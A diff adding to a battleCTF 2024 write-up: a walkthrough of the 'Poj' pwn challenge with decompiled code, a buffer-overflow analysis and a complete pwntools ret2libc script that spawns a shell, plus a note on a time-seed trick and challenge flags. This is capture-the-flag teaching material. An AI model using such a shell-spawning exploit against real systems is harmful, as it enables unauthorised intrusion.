@@ -112,6 +112,132 @@ Flag: battleCTF{pwn2live_d7c51d9effacfe021fa0246e031c63e9116d8366875555771349d96
 
 This is the solution in pdf format: [solution](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/battlectf24/Dororo/Dororo.pdf)
 
+**Poj**
+
+We are given an executable, and checking the file type and protections enabled on it shows this
+![image](https://github.com/user-attachments/assets/876eb265-ca59-4e9b-9da0-f07d02af3a4c)
+
+So this is a 64 bits binary which is dynamically linked and stripped
+
+From the result of `checksec` we can see:
+- NX is enabled
+- PIE is enabled
+
+I ran it to get an overview of what it does but i got this
+![image](https://github.com/user-attachments/assets/303204c0-50d8-4765-a3c2-ff9a8123eb58)
+
+I didn't know why i was getting this error so instead i just went ahead to decompile it
+
+Here's the main function
+![image](https://github.com/user-attachments/assets/37704d82-bc4e-48a5-b1ea-480fd2646c9d)
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  write(1, "Africa battle CTF 2024\n", 0x17uLL);
+  printf("Write() address : %p\n", &write);
+  return sub_115C();
+}
+```
+
+We can see it would give us a libc leak for the write function then calls function `sub_115C`
+
+Here's the decompilation
+![image](https://github.com/user-attachments/assets/a0094c5e-6505-401f-9253-274c3ec6fbc1)
+
+```c
+ssize_t sub_115C()
+{
+  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF
+
+  return read(0, buf, 0x100uLL);
+}
+```
+
+We can see an obvious buffer overflow because it's reading at most `0x100` bytes into a buffer that can only hold up `64` bytes of data
+
+This means the offset from the buffer to the saved return address is `64 + 8 = 72`
+
+From this point to get the libc base we just subtract the libc leak of write with the offset of write@libc
+
+And with the libc base we can just go ahead with ROP
+
+Since i couldnt debug remotely i just went ahead exploiting it on the remote instance
+
+Here's my solve script
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('poj')
+libc = ELF("./libc.so.6")
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+
+filterwarnings("ignore")
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+
+def solve():
+
+    io.recvuntil("address :")
+    libc.address = int(io.recvline().strip(), 16) - libc.sym["write"]
+    pop_rdi = libc.address + 0x0000000000028215 # pop rdi ; ret
+    ret = libc.address + 0x000000000002668c # ret
+    sh = next(libc.search(b'/bin/sh\x00'))
+    system = libc.sym["system"]
+
+    offset = 64 + 8
+
+    payload = flat({
+        offset: [
+            pop_rdi,
+            sh,
+            ret,
+            system
+        ]
+    })
+
+    io.sendline(payload)
+
+    io.interactive()
+
+
+def main():
+    
+    init()
+    solve()
+
+
+if __name__ == '__main__':
+    main()
+```
+
 **Sweet Game**
 
 We are given an executable, and checking the file type and protections enabled on it shows this
@@ -429,6 +555,8 @@ Running it works!
 
 It also works on the remote instance
 ![image](https://github.com/user-attachments/assets/209ad47f-209b-4ef8-9744-3115227d54d8)
+
+During the time I solved it i didn't overwrite the seed variable because it uses the current time, so i just ran it multiple times till the point that my current time matches that on remote, the other process remains the same!
 
 ```
 Flag: battleCTF{TimeRand_hijack2Secc0mpF1!t3rBypass_3965657b94b0a5129710dc275f6d98e427be1aa1b83b448445e0329cf3f7e4e1}
